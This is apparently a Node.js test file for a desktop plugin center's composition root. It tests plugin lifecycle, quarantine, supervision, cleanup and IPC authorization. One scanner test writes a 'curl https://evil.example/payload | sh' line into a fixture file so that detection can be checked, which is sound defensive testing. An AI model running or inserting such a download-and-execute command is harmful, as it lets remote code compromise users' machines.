'use strict';

// ---------------------------------------------------------------------------
// createPluginCenter 组装根（composition root）端到端单测。
//
// 被测模块（只读，不修改）：scripts/plugin-core/index.js 及其真实依赖。
// 依据 docs/plugin-center-architecture.md §3 的公共接口，验证「组装」的接线
// 正确性：inventory 分组 / lifecycle 开关·卸载·恢复 / quarantine 隔离闭环 /
// updates / scan / markers / supervision / bootCleanup / removedIds / ipc。
//
// 隔离铁律：全部临时目录注入（os.tmpdir + mkdtemp），getHome → tmp home，
// 绝不读写真实 ~/.dsh；Electron 能力（dialogs.confirm）注入桩，零网络、零 Electron。
// ---------------------------------------------------------------------------

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { createPluginCenter } = require('../plugin-core/index.js');
const { PLUGIN_ERROR_CODES } = require('../plugin-core/lib/errors');

// ── 工具 ─────────────────────────────────────────────────────────────────────

/** 每个测试独立的临时目录；after 钩子清理。 */
const tmp = (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pc-center-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
};

/**
 * 构造一个真实的 createPluginCenter + 已播种的 profile。
 *
 * 默认播种：
 *   - profiles/web/package.json：bundles ['@deepseek-ai/dsh-base','dsh-pocket',
 *     'broken-third-party'] + 对应 dependencies；
 *   - profiles/web/cordis.patch.yml：一个 removed:true 的配套条目 input-history
 *     （让清单出现 removed 组且 restorable=true）；
 *   - node_modules 下对应的包目录（可卸载/可扫描）。
 */
function makeCenter(t, opts = {}) {
  const home = tmp(t);
  const profileDir = path.join(home, 'profiles', 'web');
  fs.mkdirSync(profileDir, { recursive: true });

  const bundles = opts.bundles || ['@deepseek-ai/dsh-base', 'dsh-pocket', 'broken-third-party'];
  const dependencies = opts.dependencies !== undefined ? opts.dependencies : {
    '@deepseek-ai/dsh-base': '1.0.0',
    'dsh-pocket': '1.0.0',
    'broken-third-party': '1.0.0',
  };

  fs.writeFileSync(path.join(profileDir, 'package.json'), JSON.stringify({
    name: 'dsh-profile-web',
    private: true,
    dependencies,
    dsh: { profile: { bundles } },
  }, null, 2) + '\n');

  fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), opts.patch !== undefined ? opts.patch : (
    '# dsh web profile patch（由 DSH Desktop 维护）\n'
    + '- id: input-history\n'
    + "  name: 'dsh-input-history'\n"
    + '  removed: true\n'
    + '  disabled: true\n'
  ));

  const seedModules = opts.seedModules !== undefined
    ? opts.seedModules
    : ['@deepseek-ai/dsh-base', 'dsh-pocket', 'broken-third-party'];
  for (const name of seedModules) {
    const dir = path.join(profileDir, 'node_modules', ...name.split('/'));
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name, version: '1.0.0' }));
  }

  const logs = [];
  const center = createPluginCenter({
    getHome: () => home,
    getProfile: () => 'web',
    log: (topic, msg) => logs.push(topic + ': ' + msg),
    dialogs: opts.dialogs || { confirm: async () => true },
    getAgentBusy: opts.getAgentBusy || (() => false),
  });

  return {
    home,
    profileDir,
    center,
    logs,
    stateFile: path.join(home, 'desktop-plugin-state.json'),
    patchFile: path.join(profileDir, 'cordis.patch.yml'),
    manifestFile: path.join(profileDir, 'package.json'),
  };
}

/** 可控假时钟（把 Date.now 钉到可变 now 上，测试结束经 t.after 恢复）。 */
function withFakeClock(t) {
  let now = 0;
  const orig = Date.now;
  Date.now = () => now;
  t.after(() => { Date.now = orig; });
  return {
    get now() { return now; },
    set now(v) { now = v; },
  };
}

// ── 1. 导出 API 表面 ─────────────────────────────────────────────────────────

test('center: 组装根暴露架构文档 §3 的完整 API 表面', (t) => {
  const c = makeCenter(t);
  const api = c.center;

  assert.equal(typeof api.inventory.rows, 'function');
  assert.equal(typeof api.inventory.collect, 'function');
  assert.equal(typeof api.inventory.describe, 'function');

  assert.equal(typeof api.lifecycle.setEnabled, 'function');
  assert.equal(typeof api.lifecycle.uninstall, 'function');
  assert.equal(typeof api.lifecycle.restore, 'function');

  assert.equal(typeof api.updates.sources, 'object');
  assert.equal(typeof api.updates.checkUpdates, 'function');
  assert.equal(typeof api.updates.update, 'function');
  // 更新源表与历史 PLUGIN_UPDATE_SOURCES 一致。
  assert.deepEqual(Object.keys(api.updates.sources).sort(),
    ['better-sidebar', 'compaction-acp', 'side-session']);

  assert.equal(typeof api.quarantine.apply, 'function');
  assert.equal(typeof api.quarantine.applyBySource, 'function');
  assert.equal(typeof api.quarantine.clear, 'function');

  assert.equal(typeof api.scan.profile, 'function');

  assert.equal(typeof api.markers.parseMarkers, 'function');
  assert.equal(typeof api.markers.createMarkerAccumulator, 'function');

  assert.equal(typeof api.isMutating, 'function');
  assert.equal(typeof api.bootCleanup, 'function');
  assert.equal(typeof api.removedIds, 'function');

  // 底层句柄（同步器/自愈共用）。
  assert.ok(api.state, 'state 句柄存在');
  assert.equal(typeof api.state.isUninstalled, 'function');
  assert.equal(typeof api.state.isQuarantined, 'function');
  assert.ok(api.manifestStore, 'manifestStore 句柄存在');
  assert.equal(typeof api.manifestStore.bundles, 'function');
  assert.ok(api.patchGate, 'patchGate 句柄存在');
  assert.equal(typeof api.patchGate.run, 'function');

  assert.equal(typeof api.ipc.actions, 'object');
  assert.equal(typeof api.ipc.confirmMessages, 'object');
  assert.equal(typeof api.ipc.authorize, 'function');
  assert.equal(typeof api.supervision, 'function');
});

// ── 2. inventory.rows() 分组语义 ─────────────────────────────────────────────

test('inventory: 播种夹具的分组正确（core/companion/community/removed）+ 无重复 + describe', (t) => {
  const c = makeCenter(t);
  const rows = c.center.inventory.rows();

  const core = rows.find((r) => r.id === 'dsh-base');
  assert.ok(core, '核心 bundle 以去 scope 后的 id 出现');
  assert.equal(core.group, 'core');
  assert.equal(core.toggleable, false);
  assert.equal(core.restorable, false);

  const companion = rows.find((r) => r.id === 'dsh-pocket');
  assert.ok(companion);
  assert.equal(companion.group, 'companion');
  assert.equal(companion.toggleable, true);
  assert.equal(companion.restorable, true);

  const community = rows.find((r) => r.id === 'broken-third-party');
  assert.ok(community, '第三方 bundle 归入 community 组');
  assert.equal(community.group, 'community');
  assert.equal(community.toggleable, true);
  assert.equal(community.restorable, false);

  const removed = rows.find((r) => r.id === 'input-history');
  assert.ok(removed, '带 removed 标记的配套条目归入 removed 组');
  assert.equal(removed.group, 'removed');
  assert.equal(removed.removed, true);
  assert.equal(removed.restorable, true, 'removed 组的配套条目仍可恢复');

  // 无重复 id。
  const ids = rows.map((r) => r.id);
  assert.equal(new Set(ids).size, ids.length, '清单 id 不得重复');

  // describe 命中返回行，未命中返回 null。
  assert.ok(c.center.inventory.describe('dsh-base'));
  assert.equal(c.center.inventory.describe('no-such-id'), null);
});

// ── 3. lifecycle.setEnabled ──────────────────────────────────────────────────

test('lifecycle.setEnabled: 关闭写入 disabled 覆盖行，二次调用幂等（字节不变）', async (t) => {
  const c = makeCenter(t);

  const res = await c.center.lifecycle.setEnabled('dsh-pocket', false);
  assert.equal(res.ok, true);
  assert.equal(res.restartRequired, true);

  let patch = fs.readFileSync(c.patchFile, 'utf8');
  assert.match(patch, /- id: dsh-pocket/);
  assert.match(patch, /disabled: true/);

  const afterFirst = fs.readFileSync(c.patchFile, 'utf8');
  await c.center.lifecycle.setEnabled('dsh-pocket', false);
  const afterSecond = fs.readFileSync(c.patchFile, 'utf8');
  assert.equal(afterSecond, afterFirst, '二次关闭幂等，patch 字节不变');
});

test('lifecycle.setEnabled: 核心组件拒绝（code=PLUGIN_NOT_TOGGLEABLE）', async (t) => {
  const c = makeCenter(t);
  await assert.rejects(
    c.center.lifecycle.setEnabled('dsh-base', false),
    (err) => err.code === PLUGIN_ERROR_CODES.PLUGIN_NOT_TOGGLEABLE
  );
});

// ── 4. lifecycle.uninstall：第三方四层彻底 ───────────────────────────────────

test('lifecycle.uninstall: 第三方插件四层全清 + restore 拒绝（PLUGIN_RESTORE_NO_SOURCE）', async (t) => {
  const c = makeCenter(t);

  const res = await c.center.lifecycle.uninstall('broken-third-party');
  assert.equal(res.ok, true);
  assert.equal(res.restartRequired, true);

  // 层 1：状态文件条目。
  const stateJson = JSON.parse(fs.readFileSync(c.stateFile, 'utf8'));
  assert.ok(stateJson.uninstalled['broken-third-party'], '状态文件含卸载决策');
  assert.equal(stateJson.uninstalled['broken-third-party'].name, 'broken-third-party');

  // 层 2：patch removed + disabled 顶层条目。
  const patch = fs.readFileSync(c.patchFile, 'utf8');
  assert.match(patch, /- id: broken-third-party/);
  assert.match(patch, /removed: true/);
  assert.match(patch, /disabled: true/);

  // 层 3：manifest bundles 条目 gone + dependencies 键 gone。
  const manifest = JSON.parse(fs.readFileSync(c.manifestFile, 'utf8'));
  assert.ok(!manifest.dsh.profile.bundles.includes('broken-third-party'), 'bundles 登记移除');
  assert.ok(!(manifest.dependencies && manifest.dependencies['broken-third-party']), 'dependencies 键移除（防 pnpm 复活）');

  // 层 4：node_modules 目录 gone。
  assert.ok(!fs.existsSync(path.join(c.profileDir, 'node_modules', 'broken-third-party')), '包目录移除');

  // 第三方无源可恢复。
  await assert.rejects(
    c.center.lifecycle.restore('broken-third-party'),
    (err) => err.code === PLUGIN_ERROR_CODES.PLUGIN_RESTORE_NO_SOURCE
  );
});

// ── 5. lifecycle.uninstall + restore 配套插件往返 ─────────────────────────────

test('lifecycle: 配套插件卸载→恢复往返（状态清除 + patch 条目移除）', async (t) => {
  const c = makeCenter(t);
  // 假装的配套包目录（恢复语义：sync 下次重新装配复制）。
  const dir = path.join(c.profileDir, 'node_modules', 'dsh-change-review');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'dsh-change-review', version: '1.0.0' }));

  const res1 = await c.center.lifecycle.uninstall('change-review');
  assert.equal(res1.ok, true);

  // 全层：状态 / patch removed / 目录 gone。
  assert.ok(c.center.state.isUninstalled('change-review'));
  let patch = fs.readFileSync(c.patchFile, 'utf8');
  assert.match(patch, /- id: change-review/);
  assert.match(patch, /removed: true/);
  assert.ok(!fs.existsSync(path.join(c.profileDir, 'node_modules', 'dsh-change-review')), '目录已移出');

  // 卸载后 group 变 removed，但 restorable 仍成立（恢复资格与分组解耦）。
  const rowAfter = c.center.inventory.rows().find((r) => r.id === 'change-review');
  assert.equal(rowAfter.group, 'removed');
  assert.equal(rowAfter.restorable, true);

  const res2 = await c.center.lifecycle.restore('change-review');
  assert.equal(res2.ok, true);
  assert.equal(c.center.state.isUninstalled('change-review'), false, '卸载决策清除');
  patch = fs.readFileSync(c.patchFile, 'utf8');
  assert.ok(!patch.includes('change-review'), '恢复后 patch 条目移除（sync 会重新复制）');
});

// ── 6. quarantine.apply + setEnabled 用户恢复闭环 ─────────────────────────────

test('quarantine: apply 写 disabled 行 + 状态；setEnabled(true) 解除（闭环）', async (t) => {
  const c = makeCenter(t);

  const r = await c.center.quarantine.apply('broken-third-party', { source: 'runtime', reason: '异常' });
  assert.equal(r.ok, true);
  assert.equal(r.applied, true);

  let patch = fs.readFileSync(c.patchFile, 'utf8');
  assert.match(patch, /- id: broken-third-party/);
  assert.match(patch, /disabled: true/);
  assert.equal(c.center.state.isQuarantined('broken-third-party'), true);

  // 用户重新启用 = 解除自动隔离决策 + 移除 disabled 覆盖行。
  const res = await c.center.lifecycle.setEnabled('broken-third-party', true);
  assert.equal(res.ok, true);
  assert.equal(c.center.state.isQuarantined('broken-third-party'), false, '隔离决策清除');
  patch = fs.readFileSync(c.patchFile, 'utf8');
  assert.ok(!patch.includes('broken-third-party'), 'disabled 覆盖行移除');
});

// ── 7. quarantine.applyBySource ───────────────────────────────────────────────

test('quarantine.applyBySource: 按包名命中 applied；未映射来源 applied=false', async (t) => {
  const c = makeCenter(t);

  const r1 = await c.center.quarantine.applyBySource('broken-third-party', { source: 'runtime' });
  assert.equal(r1.ok, true);
  assert.equal(r1.applied, true);
  assert.equal(c.center.state.isQuarantined('broken-third-party'), true);

  const r2 = await c.center.quarantine.applyBySource('unmapped-src', { source: 'runtime' });
  assert.equal(r2.ok, true);
  assert.equal(r2.applied, false);
});

// ── 8. removedIds()：patch removed 行 ∪ state.uninstalled ─────────────────────

test('removedIds: patch removed 行 ∪ state.uninstalled；卸载后含 id，恢复后不含', async (t) => {
  const c = makeCenter(t);

  // 播种的 patch removed 行（input-history）无 state 决策，也进并集。
  assert.ok(c.center.removedIds().has('input-history'));

  const dir = path.join(c.profileDir, 'node_modules', 'dsh-change-review');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'dsh-change-review', version: '1.0.0' }));

  await c.center.lifecycle.uninstall('change-review');
  assert.ok(c.center.removedIds().has('change-review'), '卸载后并集包含该 id');
  assert.ok(c.center.removedIds().has('input-history'), '其余 removed 行仍保留');

  await c.center.lifecycle.restore('change-review');
  assert.ok(!c.center.removedIds().has('change-review'), '恢复后并集不含该 id');
});

// ── 9. markers：跨 chunk 累积解析往返 ────────────────────────────────────────

test('markers: parseMarkers 与 createMarkerAccumulator 跨 chunk 断裂往返', (t) => {
  const c = makeCenter(t);
  const marker = '[loader-isolation] entry broken-third-party (broken-third-party)';

  // parseMarkers 直接解析。
  const direct = c.center.markers.parseMarkers(marker);
  assert.deepEqual(direct.isolations, [{ id: 'broken-third-party', name: 'broken-third-party' }]);

  // accumulator 跨 chunk 断裂恰好解析一次。
  const acc = c.center.markers.createMarkerAccumulator();
  const cut = marker.indexOf('(');
  const r1 = acc(marker.slice(0, cut));
  const r2 = acc(marker.slice(cut));
  assert.equal(r1.isolations.length, 0, '前片残缺不产出');
  const total = [...r1.isolations, ...r2.isolations];
  assert.equal(total.length, 1, '跨 chunk 断裂恰好解析一次');
  assert.deepEqual(total[0], { id: 'broken-third-party', name: 'broken-third-party' });
});

// ── 10. supervision 工厂接线 ─────────────────────────────────────────────────

test('supervision: 成功探活不触发 onZombie（center 工厂接线）', async (t) => {
  const c = makeCenter(t);
  const clock = withFakeClock(t);

  let zombie = 0;
  const sup = c.center.supervision({
    getBaseUrl: () => 'http://127.0.0.1:8321',
    httpGet: async () => ({ statusCode: 200 }),
    isBusy: () => false,
    onZombie: () => { zombie += 1; },
  });
  assert.equal(typeof sup.start, 'function');
  assert.equal(typeof sup.stop, 'function');
  assert.equal(typeof sup.tick, 'function');
  assert.equal(typeof sup.state, 'function');

  clock.now = 0;
  sup.start(); // startAt = 0
  clock.now = 200000; // 越过 grace(120s) 与 cooldown(60s)
  await sup.tick();
  await sup.tick();
  assert.equal(zombie, 0, '成功探活不触发 onZombie');
  sup.stop();
});

test('supervision: 连续 3 次失败触发 onZombie 恰好一次', async (t) => {
  const c = makeCenter(t);
  const clock = withFakeClock(t);

  let zombie = 0;
  const sup = c.center.supervision({
    getBaseUrl: () => 'http://127.0.0.1:8321',
    httpGet: async () => ({ statusCode: 0 }),
    isBusy: () => false,
    onZombie: () => { zombie += 1; },
  });

  clock.now = 0;
  sup.start();
  clock.now = 300000;
  await sup.tick();
  await sup.tick();
  assert.equal(zombie, 0, '两次失败未达阈值');
  await sup.tick();
  assert.equal(zombie, 1, '第三次失败触发 onZombie 一次');
  await sup.tick();
  assert.equal(zombie, 1, '触发后计数归零，不重复触发');
  sup.stop();
});

test('supervision: api.isMutating 接线到 isBusy（变更进行中不触发假活）', async (t) => {
  const c = makeCenter(t);
  const clock = withFakeClock(t);

  const dir = path.join(c.profileDir, 'node_modules', 'dsh-change-review');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'dsh-change-review', version: '1.0.0' }));

  // 用状态写锁把卸载「架」在半空，制造确定性的「变更进行中」窗口。
  let releaseStateGate;
  const hold = c.center.state.gate.run('desktop-plugin-state', () => new Promise((resolve) => {
    releaseStateGate = resolve;
  }));
  const pending = c.center.lifecycle.uninstall('change-review');
  assert.equal(c.center.isMutating(), true, '卸载在途时 isMutating 为真');

  let zombie = 0;
  const sup = c.center.supervision({
    getBaseUrl: () => 'http://127.0.0.1:8321',
    httpGet: async () => ({ statusCode: 0 }),
    isBusy: () => false, // 用户侧判忙恒假，只有 api.isMutating 能拦下
    onZombie: () => { zombie += 1; },
  });

  clock.now = 0;
  sup.start();
  clock.now = 400000;
  await sup.tick();
  await sup.tick();
  await sup.tick();
  assert.equal(zombie, 0, '变更进行中 isBusy 为真 → 不触发 onZombie');

  releaseStateGate();
  await hold;
  await pending;
  assert.equal(c.center.isMutating(), false, '变更完成后 isMutating 归假');
  sup.stop();
});

test('supervision: getAgentBusy 接线到 isBusy（agent 回合进行中不触发假活）', async (t) => {
  let agentBusy = false;
  const c = makeCenter(t, { getAgentBusy: () => agentBusy });
  const clock = withFakeClock(t);

  let zombie = 0;
  const sup = c.center.supervision({
    getBaseUrl: () => 'http://127.0.0.1:8321',
    httpGet: async () => ({ statusCode: 0 }),
    isBusy: () => false, // 用户侧判忙恒假，只有 getAgentBusy 能拦下
    onZombie: () => { zombie += 1; },
  });

  clock.now = 0;
  sup.start();
  clock.now = 500000;
  agentBusy = true;
  await sup.tick();
  await sup.tick();
  await sup.tick();
  assert.equal(zombie, 0, 'agent 回合进行中 isBusy 为真 → 不触发 onZombie');

  agentBusy = false;
  await sup.tick();
  assert.equal(zombie, 1, '回合结束后继续失败 → 触发 onZombie（真死兜底）');
  sup.stop();
});

test('supervision: 工厂透传时间参数（intervalMs/graceMs/cooldownMs/failThreshold 不被门面吞掉）', async (t) => {
  const c = makeCenter(t);
  const clock = withFakeClock(t);

  const sup = c.center.supervision({
    getBaseUrl: () => 'http://127.0.0.1:8321',
    httpGet: async () => ({ statusCode: 200 }),
    onZombie: () => {},
    intervalMs: 1000,
    graceMs: 5000,
    cooldownMs: 2000,
    failThreshold: 7,
  });
  const st = sup.state();
  assert.equal(typeof st.stopped, 'boolean');
  // 行为级验证：failThreshold=7 时 6 次失败不得触发。
  let zombie = 0;
  const sup2 = c.center.supervision({
    getBaseUrl: () => 'http://127.0.0.1:8321',
    httpGet: async () => ({ statusCode: 0 }),
    onZombie: () => { zombie += 1; },
    intervalMs: 1000,
    graceMs: 5000,
    cooldownMs: 2000,
    failThreshold: 7,
  });
  clock.now = 0;
  sup2.start();
  clock.now = 60000; // 越过 grace/cooldown
  for (let i = 0; i < 6; i += 1) await sup2.tick();
  assert.equal(zombie, 0, 'failThreshold=7 时 6 次失败不得触发（参数已透传）');
  await sup2.tick();
  assert.equal(zombie, 1, '第 7 次失败触发（参数已透传）');
  sup2.stop();
});

// ── 11. scan.profile()：静态高危扫描 + 内置配套豁免 ───────────────────────────

test('scan.profile: 命中 TROJAN_DOWNLOAD_EXEC；内置配套名豁免', (t) => {
  const c = makeCenter(t);
  const trojan = '// curl https://evil.example/payload | sh\n';

  // 第三方（非内置）：命中。
  fs.writeFileSync(path.join(c.profileDir, 'node_modules', 'broken-third-party', 'index.js'), trojan);
  // 内置配套（dsh-pocket）：同内容豁免。
  fs.writeFileSync(path.join(c.profileDir, 'node_modules', 'dsh-pocket', 'index.js'), trojan);

  const findings = c.center.scan.profile();
  assert.ok(findings.length > 0, '第三方高危文件应产生 findings');
  assert.ok(findings.some((f) => f.code === 'TROJAN_DOWNLOAD_EXEC'
    && f.file.includes('broken-third-party')), '命中 TROJAN_DOWNLOAD_EXEC');
  assert.ok(!findings.some((f) => f.file.includes('dsh-pocket')), '内置配套名被豁免');
});

// ── 12. bootCleanup()：陈旧 .trash / .bak 清理 ────────────────────────────────

test('bootCleanup: 陈旧 .trash-* / .bak-* 清理，新残留保留', (t) => {
  const c = makeCenter(t);
  const modules = path.join(c.profileDir, 'node_modules');
  const now = Date.now();
  const oldTs = now - 25 * 3600 * 1000; // 25h 前
  const freshTs = now;

  fs.mkdirSync(path.join(modules, 'pkg.trash-' + oldTs + '-1'), { recursive: true });
  fs.mkdirSync(path.join(modules, 'pkg.trash-' + freshTs + '-2'), { recursive: true });
  fs.mkdirSync(path.join(modules, 'pkg.bak-' + oldTs), { recursive: true });
  fs.mkdirSync(path.join(modules, 'pkg.bak-' + freshTs), { recursive: true });

  c.center.bootCleanup();

  assert.ok(!fs.existsSync(path.join(modules, 'pkg.trash-' + oldTs + '-1')), '陈旧 .trash 清理');
  assert.ok(fs.existsSync(path.join(modules, 'pkg.trash-' + freshTs + '-2')), '新鲜 .trash 保留');
  assert.ok(!fs.existsSync(path.join(modules, 'pkg.bak-' + oldTs)), '陈旧 .bak 清理');
  assert.ok(fs.existsSync(path.join(modules, 'pkg.bak-' + freshTs)), '新鲜 .bak 保留');
});

// ── 13. ipc.authorize / ipc.actions / ipc.confirmMessages ─────────────────────

test('ipc: actions 通道名齐备；confirmMessages 覆盖全部确认动作；authorize origin 精确校验', (t) => {
  const c = makeCenter(t);
  const api = c.center;

  // 能力表通道名（与文档 §7 一致）。
  const expectedChannels = [
    'dsh:plugin-list',
    'dsh:plugin-set-enabled',
    'dsh:plugin-uninstall',
    'dsh:plugin-restore',
    'dsh:plugin-check-updates',
    'dsh:plugin-update',
    'dsh:diag-run',
    'dsh:diag-export',
    'dsh:diag-validate',
    'dsh:diag-order',
    'dsh:diag-order-apply',
    'dsh:diag-remove-bundle',
    'dsh:backup-export',
    'dsh:backup-restore',
    'guard:action',
  ];
  for (const ch of expectedChannels) {
    assert.ok(api.ipc.actions[ch], '缺少通道 ' + ch);
  }
  assert.equal(Object.keys(api.ipc.actions).length, expectedChannels.length, '通道数精确一致');

  // confirmMessages 覆盖每个 confirm!=null 的动作。
  for (const spec of Object.values(api.ipc.actions)) {
    if (spec.confirm !== null) {
      assert.ok(Object.prototype.hasOwnProperty.call(api.ipc.confirmMessages, spec.confirm),
        '动作 confirm 键 ' + spec.confirm + ' 缺失文案');
      assert.ok(api.ipc.confirmMessages[spec.confirm].length > 0);
    }
  }

  // authorize：合法 origin 通过。
  const webContents = {};
  const mainWindow = { webContents };
  const event = { sender: webContents, senderFrame: { url: 'http://127.0.0.1:8321/x' } };
  const deps = { mainWindow, getWebUrl: () => 'http://127.0.0.1:8321' };
  const ok = api.ipc.authorize(event, deps, 'dsh:plugin-list');
  assert.equal(ok.ok, true);

  // origin 不匹配 → UNAUTHORIZED。
  const badEvent = { sender: webContents, senderFrame: { url: 'http://evil.example:8321/x' } };
  const denied = api.ipc.authorize(badEvent, deps, 'dsh:plugin-list');
  assert.equal(denied.ok, false);
  assert.ok(denied.error, '拒绝时返回 error');
  assert.equal(denied.error.code, PLUGIN_ERROR_CODES.UNAUTHORIZED);
});
